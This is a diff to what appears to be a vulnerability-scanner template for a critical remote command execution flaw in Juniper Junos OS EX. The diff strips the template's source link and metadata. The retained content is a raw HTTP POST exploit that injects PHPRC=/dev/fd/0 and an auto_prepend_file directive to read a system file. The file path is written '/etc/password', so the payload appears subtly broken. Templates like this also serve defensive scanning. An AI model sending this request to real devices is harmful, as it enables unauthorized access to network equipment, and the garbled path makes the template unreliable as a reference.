@@ -3,12 +3,8 @@ info:
   name: Juniper Networks Junos OS EX远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fk49424n61txbq2z'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fk49424n61txbq2z
-    fofa: 暂无
 http:
 - raw:
   - 'POST /?PHPRC=/dev/fd/0 HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-
-
 
 
     auto_prepend_file="/etc/password"
